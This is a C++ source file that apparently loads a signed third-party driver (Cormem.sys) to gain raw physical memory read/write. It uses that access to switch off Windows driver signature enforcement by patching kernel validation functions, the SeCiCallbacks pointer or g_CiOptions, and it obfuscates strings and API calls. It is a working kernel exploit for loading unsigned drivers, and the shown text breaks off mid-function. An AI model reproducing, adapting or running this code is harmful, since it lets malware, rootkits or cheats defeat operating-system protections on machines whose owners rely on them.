#pragma once
#pragma warning(disable: 4996)
#include <Windows.h>
#include <iostream>
#include <string>
#include <random>
#include <fstream>
#include <Psapi.h>
#include "Includes/Definitions/skcrypt.h"
#include "Includes/Definitions\xorst.h"

#pragma comment(lib, "psapi.lib")

typedef unsigned long u32;
typedef unsigned long long u64;

#define DRIVER_NAME_LEN 16

// CorMem IOCTL codes (direct device communication - no DLL needed)
#define IOCTL_CORMEM_MAP_BUFFER    0x22200C
#define IOCTL_CORMEM_UNMAP_BUFFER  0x222010

// CorMem structures
#pragma pack(push, 1)
struct CORMEM_MAP_BUFFER_IN {
	uint64_t Address;
	uint64_t Size;
	uint64_t Param2;
};
#pragma pack(pop)

// Processor Start Block offsets (for DTB discovery from low stub)
#define PSB_SIGNATURE_OFFSET    0x000
#define PSB_KERNEL_ENTRY_OFFSET 0x070
#define PSB_PML4_OFFSET         0x0A0
#define PSB_SIGNATURE_MASK      0xffffffffffff00ffULL
#define PSB_SIGNATURE_VALUE     0x00000001000600E9ULL
#define KERNEL_VA_MASK          0xfffff80000000003ULL
#define KERNEL_VA_EXPECTED      0xfffff80000000000ULL
#define PML4_INVALID_BITS_MASK  0xffffff0000000fffULL

// Global CorMem device handle
HANDLE cormem_device = INVALID_HANDLE_VALUE;

char dse_original_1[6] = { 0x00,0x00,0x00,0x00,0x00,0x00 };
char dse_original_2[6] = { 0x00,0x00,0x00,0x00,0x00,0x00 };

uint8_t patch[6] = {
	0xB8, 0x00, 0x00, 0x00, 0x00, // mov eax, 0
	0xC3                          // ret
};

// DSE bypass mode flags
bool g_CiOptions_mode = false;   // CI.dll g_CiOptions (fallback, fails on Win11 KDP)
bool SeCiCallbacks_mode = false; // ntoskrnl SeCiCallbacks function pointer patching

// g_CiOptions state
u32 g_CiOptions_original = 0;
u32 g_CiOptions_disabled = 0; // 0 = DSE disabled

// SeCiCallbacks state
u64 orig_ci_header_cb = 0;   // original CiValidateImageHeader pointer
u64 replacement_cb_va = 0;   // kernel VA of ZwFlushInstructionCache (replacement)

// Byte patterns for SeValidateImageData / SeValidateImageHeader in ntoskrnl.exe
// 0x00 bytes act as wildcards (match any byte). These match the function prologues.
static const uint8_t se_validate_image_data_sig[] = {
	0x48, 0x83, 0xEC, 0x48, 0x48, 0x8B, 0x05, 0x00,
	0x00, 0x00, 0x00, 0x4C, 0x8B, 0xD1, 0x48, 0x85, 0xC0
};

static const uint8_t se_validate_image_header_sig[] = {
	0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x48,
	0x89, 0x70, 0x10, 0x57, 0x48, 0x81, 0xEC, 0xA0,
	0x00, 0x00, 0x00, 0x33, 0xF6
};

// 0mWindyBug pattern: tail of 'call' + 'mov rdx, rbx' + 'lea r8, [rip+SeCiCallbacks]'
// near the CiInitialize call site in ntoskrnl. Used as fallback when Se* patterns fail.
static const uint8_t lea_se_ci_callbacks_sig[] = {
	0xFF, 0x48, 0x8B, 0xD3, 0x4C, 0x8D, 0x05
};

// Validate a kernel-mode virtual address (must be in kernel space)
static bool is_valid_kernel_address(u64 addr) {
	return addr > 0xFFFFF80000000000ULL && addr < 0xFFFFFFFFFFFFFFF0ULL;
}

bool cormem_send_ioctl(DWORD code, void* in_buf, DWORD in_size, void* out_buf, DWORD out_size) {
	if (cormem_device == INVALID_HANDLE_VALUE) return false;
	DWORD bytes_returned = 0;
	return DeviceIoControl(cormem_device, code, in_buf, in_size, out_buf, out_size, &bytes_returned, NULL);
}

uint64_t cormem_map_buffer(uint64_t phys_addr, uint64_t size) {
	SYSTEM_INFO si = {};
	GetSystemInfo(&si);
	// Adjust size for page alignment (same as cordrv.cpp)
	size += phys_addr & (si.dwPageSize - 1);

	CORMEM_MAP_BUFFER_IN in = { phys_addr, size, 0 };
	uint64_t out = 0;
	if (!cormem_send_ioctl(IOCTL_CORMEM_MAP_BUFFER, &in, sizeof(in), &out, sizeof(out)))
		return 0;
	return out;
}

void cormem_unmap_buffer(uint64_t mapped_addr) {
	cormem_send_ioctl(IOCTL_CORMEM_UNMAP_BUFFER, &mapped_addr, sizeof(mapped_addr), nullptr, 0);
}

bool init_cormem_device() {
	cormem_device = CreateFileA("\\\\.\\CORMEM", GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (cormem_device == INVALID_HANDLE_VALUE) {
		printf("[!] Failed to open CORMEM device (error %lu).\n", GetLastError());
		return false;
	}
	return true;
}

void cleanup_cormem_device() {
	if (cormem_device != INVALID_HANDLE_VALUE) {
		CloseHandle(cormem_device);
		cormem_device = INVALID_HANDLE_VALUE;
	}
}

bool read_phys(u64 addr, u64 buf, u64 size)
{
	uint64_t mapped = cormem_map_buffer(addr, size);
	if (!mapped) return false;

	__try {
		memcpy((void*)buf, (void*)mapped, (size_t)size);
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		cormem_unmap_buffer(mapped);
		return false;
	}

	cormem_unmap_buffer(mapped);
	return true;
}

bool write_phys(u64 addr, u64 buf, u64 size)
{
	// First try: standard mapping
	uint64_t mapped = cormem_map_buffer(addr, size);
	if (!mapped) {
		// Fallback: try with Param2=1 (some CorMem versions use this for write access)
		SYSTEM_INFO si = {};
		GetSystemInfo(&si);
		u64 adj_size = size + (addr & (si.dwPageSize - 1));
		CORMEM_MAP_BUFFER_IN in_rw = { addr, adj_size, 1 };
		uint64_t out = 0;
		if (cormem_send_ioctl(IOCTL_CORMEM_MAP_BUFFER, &in_rw, sizeof(in_rw), &out, sizeof(out)) && out) {
			mapped = out;
		} else {
			printf("[!] write_phys: mapping failed for PA 0x%llX.\n", addr);
			return false;
		}
	}

	// CorMem may map physical memory as read-only section view.
	// Try upgrading the page protection to PAGE_READWRITE.
	DWORD old_protect = 0;
	uintptr_t page_base = (uintptr_t)mapped & ~(uintptr_t)0xFFF;
	VirtualProtect((void*)page_base, 0x1000, PAGE_READWRITE, &old_protect);

	__try {
		memcpy((void*)mapped, (void*)buf, (size_t)size);
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		printf("[!] write_phys: access violation at VA 0x%p (PA 0x%llX).\n", (void*)mapped, addr);
		MEMORY_BASIC_INFORMATION mbi = {};
		if (VirtualQuery((void*)mapped, &mbi, sizeof(mbi)))
			printf("[!]   Page protect=0x%lX, type=0x%lX, state=0x%lX\n", mbi.Protect, mbi.Type, mbi.State);
		cormem_unmap_buffer(mapped);
		return false;
	}

	cormem_unmap_buffer(mapped);
	return true;
}

// Find system DTB (CR3) from the Processor Start Block in low memory (first 1MB)
// This is safe - the first 1MB is always conventional RAM, never MMIO
u64 find_system_dtb()
{
	uint8_t* low_mem = (uint8_t*)malloc(0x100000);
	if (!low_mem) return 0;

	// Read first 1MB page-by-page (always safe conventional memory)
	for (u32 offset = 0; offset < 0x100000; offset += 0x1000) {
		if (!read_phys(offset, (u64)(low_mem + offset), 0x1000))
			memset(low_mem + offset, 0, 0x1000);
	}

	u64 dtb = 0;

	// Scan for Processor Start Block (PSB) signature at page-aligned offsets
	for (u32 i = 0; i < 0x100000; i += 0x1000) {
		u64* page = (u64*)(low_mem + i);
		u64 sig = page[PSB_SIGNATURE_OFFSET / 8];
		u64 kernel_entry = page[PSB_KERNEL_ENTRY_OFFSET / 8];
		u64 pml4 = page[PSB_PML4_OFFSET / 8];

		// Check PSB signature
		if ((sig & PSB_SIGNATURE_MASK) != PSB_SIGNATURE_VALUE)
			continue;

		// Kernel entry must be in kernel VA range
		if ((kernel_entry & KERNEL_VA_MASK) != KERNEL_VA_EXPECTED)
			continue;

		// PML4 must be page-aligned and reasonable
		if ((pml4 & PML4_INVALID_BITS_MASK) != 0)
			continue;

		if (pml4 == 0)
			continue;

		dtb = pml4;
		break;
	}

	free(low_mem);
	return dtb;
}

// Get ntoskrnl virtual base address via Windows API (no physical memory access)
u64 get_ntoskrnl_base()
{
	LPVOID drivers[1024];
	DWORD needed = 0;
	if (!EnumDeviceDrivers(drivers, sizeof(drivers), &needed))
		return 0;

	// First driver returned is always ntoskrnl
	return (u64)drivers[0];
}

// 4-level page table walk: translate virtual address to physical using DTB
// Only reads page table entries which are always in valid RAM
u64 translate_va_to_pa(u64 dtb, u64 va)
{
	u64 pml4_idx = (va >> 39) & 0x1FF;
	u64 pdpt_idx = (va >> 30) & 0x1FF;
	u64 pd_idx = (va >> 21) & 0x1FF;
	u64 pt_idx = (va >> 12) & 0x1FF;
	u64 offset = va & 0xFFF;

	u64 pml4e = 0;
	if (!read_phys((dtb & ~0xFFFULL) + pml4_idx * 8, (u64)&pml4e, 8) || !(pml4e & 1))
		return 0;

	u64 pdpte = 0;
	if (!read_phys((pml4e & 0x000FFFFFFFFFF000ULL) + pdpt_idx * 8, (u64)&pdpte, 8) || !(pdpte & 1))
		return 0;
	if (pdpte & 0x80) // 1GB large page
		return (pdpte & 0x000FFFFFC0000000ULL) + (va & 0x3FFFFFFFULL);

	u64 pde = 0;
	if (!read_phys((pdpte & 0x000FFFFFFFFFF000ULL) + pd_idx * 8, (u64)&pde, 8) || !(pde & 1))
		return 0;
	if (pde & 0x80) // 2MB large page
		return (pde & 0x000FFFFFFFE00000ULL) + (va & 0x1FFFFFULL);

	u64 pte = 0;
	if (!read_phys((pde & 0x000FFFFFFFFFF000ULL) + pt_idx * 8, (u64)&pte, 8) || !(pte & 1))
		return 0;

	return (pte & 0x000FFFFFFFFFF000ULL) + offset;
}

// Find export RVA from a kernel module by loading its usermode copy
// Works for ntoskrnl.exe, CI.dll, etc.
u64 get_kernel_export_offset(const char* module_path, const char* func_name)
{
	HMODULE mod = LoadLibraryExA(module_path, NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (!mod) return 0;

	FARPROC proc = GetProcAddress(mod, func_name);
	if (!proc) {
		FreeLibrary(mod);
		return 0;
	}

	u64 offset = (u64)proc - (u64)mod;
	FreeLibrary(mod);
	return offset;
}

// Find the RVA of g_CiOptions in CI.dll by disassembling from the CiInitialize export.
// KDU/dsefix approach: CiInitialize -> jmp/call CipInitialize -> mov [rip+disp32], ecx = g_CiOptions
// CiInitialize IS a PE export; g_CiOptions is an internal global that controls DSE enforcement.
u64 find_g_CiOptions_rva(const char* ci_path)
{
	HMODULE ci = LoadLibraryExA(ci_path, NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (!ci) {
		printf("[!] Could not load CI.dll for analysis.\n");
		return 0;
	}

	FARPROC ci_init = GetProcAddress(ci, "CiInitialize");
	if (!ci_init) {
		printf("[!] CiInitialize not exported from CI.dll.\n");
		FreeLibrary(ci);
		return 0;
	}

	uint8_t* code = (uint8_t*)ci_init;
	uint8_t* base = (uint8_t*)ci;

	printf("[+] CiInitialize at RVA 0x%llX\n", (u64)(code - base));

	// Walk forward from CiInitialize looking for jmp(E9)/call(E8) to CipInitialize.
	// CiInitialize is a thin wrapper; it jumps/calls CipInitialize within ~256 bytes.
	// For each target, scan for 'mov [rip+disp32], ecx' (89 0D) which stores to g_CiOptions.
	for (int i = 0; i < 256; i++) {
		if (code[i] != 0xE8 && code[i] != 0xE9) continue;

		int32_t rel = *(int32_t*)(code + i + 1);
		uint8_t* target = code + i + 5 + rel;

		// Validate target is within the module image (CI.dll is typically < 2MB)
		if (target <= base || target >= base + 0x400000) continue;

		// Scan target function for 'mov [rip+disp32], ecx' (opcode 89 0D)
		// This instruction stores the CI options value into g_CiOptions
		for (int j = 0; j < 512; j++) {
			if (target[j] == 0x89 && target[j + 1] == 0x0D) {
				int32_t disp = *(int32_t*)(target + j + 2);
				// RIP-relative addressing: effective_addr = next_instruction + displacement
				uint8_t* g_ci = target + j + 6 + disp;
				u64 rva = (u64)(g_ci - base);

				printf("[+] g_CiOptions at RVA 0x%llX (via %s at +%d -> +%d)\n",
					rva, code[i] == 0xE9 ? "jmp" : "call", i, j);

				FreeLibrary(ci);
				return rva;
			}
		}
	}

	printf("[!] Could not locate g_CiOptions from CiInitialize disassembly.\n");
	FreeLibrary(ci);
	return 0;
}

// Pattern scan a PE module loaded from disk. 0x00 in pattern = wildcard (match any byte).
// Returns the RVA of the first match, or 0 if not found.
u64 find_pattern_rva_in_module(const char* module_path, const uint8_t* pattern, size_t pattern_len)
{
	HMODULE mod = LoadLibraryExA(module_path, NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (!mod) return 0;

	uint8_t* base = (uint8_t*)mod;
	PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
	if (dos->e_magic != IMAGE_DOS_SIGNATURE) { FreeLibrary(mod); return 0; }

	PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
	if (nt->Signature != IMAGE_NT_SIGNATURE) { FreeLibrary(mod); return 0; }

	DWORD image_size = nt->OptionalHeader.SizeOfImage;

	for (DWORD i = 0; i + (DWORD)pattern_len <= image_size; i++) {
		bool match = true;
		for (size_t j = 0; j < pattern_len; j++) {
			if (pattern[j] != 0x00 && base[i + j] != pattern[j]) {
				match = false;
				break;
			}
		}
		if (match) {
			FreeLibrary(mod);
			return (u64)i;
		}
	}

	FreeLibrary(mod);
	return 0;
}

// Find a kernel module's base VA by name (e.g. "CI.dll", "ntoskrnl.exe")
u64 get_kernel_module_base(const char* module_name)
{
	LPVOID drivers[1024];
	DWORD needed = 0;
	if (!EnumDeviceDrivers(drivers, sizeof(drivers), &needed))
		return 0;

	int count = needed / sizeof(LPVOID);
	for (int i = 0; i < count; i++) {
		char name[256] = {};
		if (GetDeviceDriverBaseNameA(drivers[i], name, sizeof(name))) {
			if (_stricmp(name, module_name) == 0) {
				return (u64)drivers[i];
			}
		}
	}
	return 0;
}

bool file_exists(const std::string path) {
	DWORD v0 = LI_FN(GetFileAttributesA)(path.c_str());
	return v0 != -1 && !(v0 & 0x00000010);
}

std::string GenerateRandomString(int length) {
	const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
	const int max_index = sizeof(charset) - 2;
	std::string random_string;

	std::random_device rd;
	std::mt19937 gen(rd());
	std::uniform_int_distribution<> dis(0, max_index);

	for (int i = 0; i < length; ++i) {
		random_string += charset[dis(gen)];
	}

	return random_string;
}

// SCM-based driver loader - no system() calls
bool load_driver_scm(const char* service_name, const char* bin_path) {
	SC_HANDLE scm = OpenSCManagerA(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
	if (!scm) return false;

	// Clean up any existing service with this name
	SC_HANDLE existing = OpenServiceA(scm, service_name, SERVICE_ALL_ACCESS);
	if (existing) {
		SERVICE_STATUS status;
		ControlService(existing, SERVICE_CONTROL_STOP, &status);
		Sleep(100);
		DeleteService(existing);
		CloseServiceHandle(existing);
	}

	SC_HANDLE svc = CreateServiceA(scm, service_name, service_name,
		SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
		SERVICE_ERROR_NORMAL, bin_path,
		nullptr, nullptr, nullptr, nullptr, nullptr);

	if (!svc) {
		CloseServiceHandle(scm);
		return false;
	}

	BOOL started = StartServiceA(svc, 0, nullptr);
	DWORD err = GetLastError();

	CloseServiceHandle(svc);
	CloseServiceHandle(scm);

	return started || err == ERROR_SERVICE_ALREADY_RUNNING;
}

// SCM-based driver unloader
bool unload_driver_scm(const char* service_name) {
	SC_HANDLE scm = OpenSCManagerA(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
	if (!scm) return false;

	SC_HANDLE svc = OpenServiceA(scm, service_name, SERVICE_ALL_ACCESS);
	if (!svc) {
		CloseServiceHandle(scm);
		return false;
	}

	SERVICE_STATUS status;
	ControlService(svc, SERVICE_CONTROL_STOP, &status);
	Sleep(100);
	BOOL deleted = DeleteService(svc);

	CloseServiceHandle(svc);
	CloseServiceHandle(scm);
	return deleted;
}

// SEH helpers - MSVC cannot use __try in functions with C++ objects (C2712).
// These wrappers isolate the SEH from std::string usage in LoadDriverWithDSEBypass.
static bool seh_read_volatile_u32(volatile u32* src, u32* out) {
	__try { *out = *src; return true; }
	__except (EXCEPTION_EXECUTE_HANDLER) { return false; }
}

static bool seh_write_volatile_u32(volatile u32* dst, u32 val) {
	__try { *dst = val; return true; }
	__except (EXCEPTION_EXECUTE_HANDLER) { return false; }
}

void LoadDriverWithDSEBypass(const char* DriverPath, const char* ServiceName, const char* CorMemSysPath)
{
	if (!file_exists(DriverPath))
	{
		printf(skCrypt("[!] could not find your driver.\n"));
		return;
	}

	// Resolve full path for Cormem.sys
	char full_cormem[MAX_PATH] = {};
	GetFullPathNameA(CorMemSysPath, MAX_PATH, full_cormem, nullptr);

	// Generate random service name for CorMem
	std::string cormem_svc_name = GenerateRandomString(12);

	printf("[*] Loading CorMem driver...\n");

	// Load Cormem.sys via SCM (creates \\.\CORMEM device)
	if (!load_driver_scm(cormem_svc_name.c_str(), full_cormem)) {
		DWORD err = GetLastError();
		if (err != ERROR_SERVICE_ALREADY_RUNNING) {
			printf("[!] failed to load Cormem.sys (error %lu). run as admin.\n", err);
			return;
		}
	}

	Sleep(500);

	// Open direct IOCTL handle to \\.\CORMEM device (no DLL needed)
	printf("[*] Opening CorMem device...\n");
	if (!init_cormem_device()) {
		unload_driver_scm(cormem_svc_name.c_str());
		return;
	}

	printf("[+] CorMem initialized (direct IOCTL).\n");

	// Step 1: Find system DTB from low stub (first 1MB only - always safe)
	printf("[*] Finding system DTB...\n");
	u64 system_dtb = find_system_dtb();
	if (!system_dtb) {
		printf("[!] could not find system DTB in low stub.\n");
		cleanup_cormem_device();
		unload_driver_scm(cormem_svc_name.c_str());
		return;
	}
	printf("[+] System DTB: 0x%llX\n", system_dtb);

	// Step 2: Resolve DSE functions to patch
	// Primary: pattern scan ntoskrnl for SeValidateImageData/Header (patches CODE, not KDP-protected)
	// Fallback: g_CiOptions in CI.dll (patches DATA, blocked by KDP on Win11 with Hyper-V)
	printf("[*] Resolving DSE functions...\n");

	u64 patch_pa_1 = 0;
	u64 patch_pa_2 = 0;
	int patch_count = 0;

	u64 ntos_va = get_ntoskrnl_base();
	if (ntos_va) {
		printf("[+] ntoskrnl VA: 0x%llX\n", ntos_va);

		// Pattern scan ntoskrnl.exe from disk for SeValidateImageData / SeValidateImageHeader
		printf("[*] Pattern scanning ntoskrnl for DSE validation functions...\n");
		u64 data_rva = find_pattern_rva_in_module(
			"C:\\Windows\\System32\\ntoskrnl.exe",
			se_validate_image_data_sig, sizeof(se_validate_image_data_sig));
		u64 header_rva = find_pattern_rva_in_module(
			"C:\\Windows\\System32\\ntoskrnl.exe",
			se_validate_image_header_sig, sizeof(se_validate_image_header_sig));

		if (data_rva && header_rva) {
			// Both patterns matched - use direct function prologue patching
			printf("[+] SeValidateImageData   RVA: 0x%llX\n", data_rva);
			printf("[+] SeValidateImageHeader RVA: 0x%llX\n", header_rva);
			patch_pa_1 = translate_va_to_pa(system_dtb, ntos_va + data_rva);
			patch_pa_2 = translate_va_to_pa(system_dtb, ntos_va + header_rva);
			if (patch_pa_1 && patch_pa_2) patch_count = 2;
		} else if (data_rva) {
			// Only SeValidateImageData pattern matched.
			// Extract SeCiCallbacks from its code, then swap CiValidateImageHeader callback
			// with ZwFlushInstructionCache (a no-op that always returns STATUS_SUCCESS).
			// On Win8+, if CiValidateImageHeader returns success, CiValidateImageData is
			// never called - so we only need to swap one pointer (+0x20).
			// SeCiCallbacks is in ntoskrnl .data (NOT KDP-protected).
			printf("[!] SeValidateImageHeader pattern not found.\n");
			printf("[*] Extracting SeCiCallbacks from SeValidateImageData (RVA 0x%llX)...\n", data_rva);

			HMODULE ntos_mod = LoadLibraryExA("C:\\Windows\\System32\\ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
			if (ntos_mod) {
				uint8_t* fn = (uint8_t*)ntos_mod + data_rva;

				// SeValidateImageData layout:
				//   +0: sub rsp, 0x48              (48 83 EC 48)
				//   +4: mov rax, [rip+disp32]      (48 8B 05 XX XX XX XX)
				//   +B: mov r10, rcx               (4C 8B D1)
				// The [rip+disp32] loads SeCiCallbacks.CiValidateImageData (+0x28).
				// CiValidateImageHeader is at +0x20 (8 bytes before).
				if (fn[4] == 0x48 && fn[5] == 0x8B && fn[6] == 0x05) {
					int32_t disp = *(int32_t*)(fn + 7);
					u64 ci_data_cb_rva = data_rva + 0xB + (int64_t)disp;
					u64 ci_header_cb_rva = ci_data_cb_rva - 8;

					printf("[+] SeCiCallbacks.CiValidateImageData   RVA: 0x%llX\n", ci_data_cb_rva);
					printf("[+] SeCiCallbacks.CiValidateImageHeader  RVA: 0x%llX\n", ci_header_cb_rva);

					// Resolve ZwFlushInstructionCache from ntoskrnl exports.
					// This function is a no-op on x86/x64 (I-cache is coherent) and
					// always returns STATUS_SUCCESS regardless of arguments.
					// It's a valid kCFG target and avoids NULL-callback issues.
					FARPROC flush_proc = GetProcAddress(ntos_mod, "ZwFlushInstructionCache");
					if (flush_proc) {
						u64 flush_rva = (u64)((uint8_t*)flush_proc - (uint8_t*)ntos_mod);
						replacement_cb_va = ntos_va + flush_rva;
						printf("[+] ZwFlushInstructionCache RVA: 0x%llX -> kernel VA: 0x%llX\n",
							flush_rva, replacement_cb_va);
					} else {
						printf("[!] ZwFlushInstructionCache not found in ntoskrnl exports.\n");
					}

					if (replacement_cb_va) {
						// Only need CiValidateImageHeader (+0x20). On Win8+, successful
						// header validation skips CiValidateImageData entirely.
						patch_pa_1 = translate_va_to_pa(system_dtb, ntos_va + ci_header_cb_rva);
						if (patch_pa_1) {
							SeCiCallbacks_mode = true;
							patch_count = 1;
						}
					}
				} else {
					printf("[!] Unexpected instruction at SeValidateImageData+4 (expected mov rax,[rip+disp32]).\n");
				}

				FreeLibrary(ntos_mod);
			}
		} else {
			printf("[!] SeValidateImageData pattern not found.\n");
			if (!header_rva) printf("[!] SeValidateImageHeader pattern not found.\n");

			// Fallback: 0mWindyBug LEA pattern scan.
			// Scan ntoskrnl for {FF 48 8B D3 4C 8D 05} which is the instruction sequence
			// near the CiInitialize call: call ... / mov rdx, rbx / lea r8, [rip+SeCiCallbacks]
			// The lea r8 loads the SeCiCallbacks address as the 3rd argument to CiInitialize.
			printf("[*] Trying LEA SeCiCallbacks pattern scan (0mWindyBug method)...\n");

			HMODULE ntos_mod = LoadLibraryExA("C:\\Windows\\System32\\ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
			if (ntos_mod) {
				uint8_t* base = (uint8_t*)ntos_mod;
				PIMAGE_NT_HEADERS nt_hdr = (PIMAGE_NT_HEADERS)(base +
					((PIMAGE_DOS_HEADER)base)->e_lfanew);
				DWORD ntos_size = nt_hdr->OptionalHeader.SizeOfImage;

				u64 se_ci_callbacks_rva = 0;
				for (DWORD i = 0; i + sizeof(lea_se_ci_callbacks_sig) + 4 <= ntos_size; i++) {
					bool match = true;
					for (size_t j = 0; j < sizeof(lea_se_ci_callbacks_sig); j++) {
						if (base[i + j] != lea_se_ci_callbacks_sig[j]) { match = false; break; }
					}
					if (!match) continue;

					// Found pattern. The LEA r8, [rip+disp32] starts at offset i+4 (skip FF 48 8B D3).
					// Instruction: 4C 8D 05 XX XX XX XX (7 bytes)
					// RIP-relative target = (i+4) + 7 + disp32
					// Use 32-bit arithmetic to avoid overflow (0mWindyBug technique).
					uint8_t* lea_insn = base + i + 4;
					int32_t disp = *(int32_t*)(lea_insn + 3);
					u32 insn_rva_low = (u32)(i + 4);
					u32 target_low = insn_rva_low + 7 + (u32)disp;
					se_ci_callbacks_rva = ((u64)(i + 4) & 0xFFFFFFFF00000000ULL) + target_low;
					break;
				}

				if (se_ci_callbacks_rva) {
					u64 ci_header_cb_rva = se_ci_callbacks_rva + 0x20;
					printf("[+] SeCiCallbacks RVA: 0x%llX (via LEA pattern)\n", se_ci_callbacks_rva);
					printf("[+] CiValidateImageHeader entry RVA: 0x%llX\n", ci_header_cb_rva);

					// Resolve ZwFlushInstructionCache
					FARPROC flush_proc = GetProcAddress(ntos_mod, "ZwFlushInstructionCache");
					if (flush_proc) {
						u64 flush_rva = (u64)((uint8_t*)flush_proc - base);
						replacement_cb_va = ntos_va + flush_rva;
						printf("[+] ZwFlushInstructionCache RVA: 0x%llX -> kernel VA: 0x%llX\n",
							flush_rva, replacement_cb_va);
					}

					if (replacement_cb_va) {
						patch_pa_1 = translate_va_to_pa(system_dtb, ntos_va + ci_header_cb_rva);
						if (patch_pa_1) {
							SeCiCallbacks_mode = true;
							patch_count = 1;
						}
					}
				} else {
					printf("[!] LEA SeCiCallbacks pattern not found.\n");
				}

				FreeLibrary(ntos_mod);
			}
		}
	}

	// Fallback: g_CiOptions in CI.dll (works on older Windows without KDP)
	// NOTE: On Win11 with Hyper-V, g_CiOptions is KDP-protected and writes will fail.
	if (patch_count == 0) {
		printf("[*] Trying CI.dll g_CiOptions (KDU method)...\n");

		u64 ci_va = get_kernel_module_base("CI.dll");
		if (!ci_va) {
			printf("[!] could not find CI.dll in kernel modules.\n");
			cleanup_cormem_device();
			unload_driver_scm(cormem_svc_name.c_str());
			return;
		}
		printf("[+] CI.dll VA: 0x%llX\n", ci_va);

		// Disassemble CiInitialize -> CipInitialize to find g_CiOptions RVA
		u64 ci_options_rva = find_g_CiOptions_rva("C:\\Windows\\System32\\ci.dll");
		if (!ci_options_rva) {
			printf("[!] Could not locate g_CiOptions in CI.dll.\n");
			cleanup_cormem_device();
			unload_driver_scm(cormem_svc_name.c_str());
			return;
		}

		u64 ci_options_va = ci_va + ci_options_rva;
		patch_pa_1 = translate_va_to_pa(system_dtb, ci_options_va);

		if (!patch_pa_1) {
			printf("[!] Could not translate g_CiOptions VA to physical address.\n");
			cleanup_cormem_device();
			unload_driver_scm(cormem_svc_name.c_str());
			return;
		}

		g_CiOptions_mode = true;
		patch_count = 1;
	}

	const char* mode_name = g_CiOptions_mode ? "g_CiOptions" :
		SeCiCallbacks_mode ? "SeCiCallbacks (ZwFlushInstructionCache)" : "function prologue";
	printf("[+] DSE target resolved. Patching via %s...\n", mode_name);
	printf("    Patch target PA: 0x%llX\n", patch_pa_1);
	if (patch_pa_2) printf("    Patch target 2 PA: 0x%llX\n", patch_pa_2);
	fflush(stdout);

	if (g_CiOptions_mode) {
		// g_CiOptions approach: single mapping for read + write to avoid double-map issues.
		// Map the physical page containing g_CiOptions once, read current value, write 0.
		uint64_t ci_mapped = cormem_map_buffer(patch_pa_1, sizeof(u32));
		if (!ci_mapped) {
			// Retry with Param2=1 (write-mode hint)
			SYSTEM_INFO si = {};
			GetSystemInfo(&si);
			u64 adj = sizeof(u32) + (patch_pa_1 & (si.dwPageSize - 1));
			CORMEM_MAP_BUFFER_IN in_rw = { patch_pa_1, adj, 1 };
			uint64_t out = 0;
			if (cormem_send_ioctl(IOCTL_CORMEM_MAP_BUFFER, &in_rw, sizeof(in_rw), &out, sizeof(out)) && out)
				ci_mapped = out;
		}
		if (!ci_mapped) {
			printf("[!] Failed to map g_CiOptions page (PA 0x%llX).\n", patch_pa_1);
			cleanup_cormem_device();
			unload_driver_scm(cormem_svc_name.c_str());
			return;
		}

		// Read current g_CiOptions value
		if (!seh_read_volatile_u32((volatile u32*)ci_mapped, &g_CiOptions_original)) {
			printf("[!] Failed to read g_CiOptions from mapped VA.\n");
			cormem_unmap_buffer(ci_mapped);
			cleanup_cormem_device();
			unload_driver_scm(cormem_svc_name.c_str());
			return;
		}
		printf("[+] Current g_CiOptions: 0x%X\n", g_CiOptions_original);

		// Try to upgrade page protection (CorMem may map as read-only section view)
		DWORD old_ci_protect = 0;
		uintptr_t ci_page = (uintptr_t)ci_mapped & ~(uintptr_t)0xFFF;
		if (!VirtualProtect((void*)ci_page, 0x1000, PAGE_READWRITE, &old_ci_protect)) {
			printf("[*] VirtualProtect failed (err %lu), trying direct write anyway...\n", GetLastError());
		}

		// Write 0 to disable DSE
		bool write_ok = seh_write_volatile_u32((volatile u32*)ci_mapped, g_CiOptions_disabled);
		if (!write_ok) {
			printf("[!] Exception writing g_CiOptions.\n");
		}

		if (!write_ok) {
			// Dump page info for diagnostics
			MEMORY_BASIC_INFORMATION mbi = {};
			if (VirtualQuery((void*)ci_mapped, &mbi, sizeof(mbi)))
				printf("[!] Page protect=0x%lX, type=0x%lX, state=0x%lX\n", mbi.Protect, mbi.Type, mbi.State);
			cormem_unmap_buffer(ci_mapped);
			cleanup_cormem_device();
			unload_driver_scm(cormem_svc_name.c_str());
			return;
		}

		// Verify
		u32 verify = *(volatile u32*)ci_mapped;
		cormem_unmap_buffer(ci_mapped);

		if (verify != 0) {
			printf("[!] g_CiOptions write didn't take effect (read back 0x%X).\n", verify);
			cleanup_cormem_device();
			unload_driver_scm(cormem_svc_name.c_str());
			return;
		}
		printf("[+] g_CiOptions set to 0x0 (DSE disabled).\n");
	} else if (SeCiCallbacks_mode) {
		// SeCiCallbacks swap: replace CiValidateImageHeader callback with
		// ZwFlushInstructionCache (a no-op that always returns STATUS_SUCCESS).
		// SeCiCallbacks is in ntoskrnl's .data section (NOT KDP-protected).
		// On Win8+, if CiValidateImageHeader returns success, CiValidateImageData
		// is never called - only one pointer swap needed.

		// Read and validate original callback pointer
		read_phys(patch_pa_1, (u64)&orig_ci_header_cb, sizeof(u64));
		printf("[+] Original CiValidateImageHeader cb: 0x%llX\n", orig_ci_header_cb);

		// Validate: original callback must be a valid kernel address (CI.dll function)
		if (!is_valid_kernel_address(orig_ci_header_cb)) {
			printf("[!] Original callback is not a valid kernel address. Aborting.\n");
			cleanup_cormem_device();
			unload_driver_scm(cormem_svc_name.c_str());
			return;
		}

		// Validate: replacement must also be a valid kernel address
		if (!is_valid_kernel_address(replacement_cb_va)) {
			printf("[!] ZwFlushInstructionCache VA is not valid. Aborting.\n");
			cleanup_cormem_device();
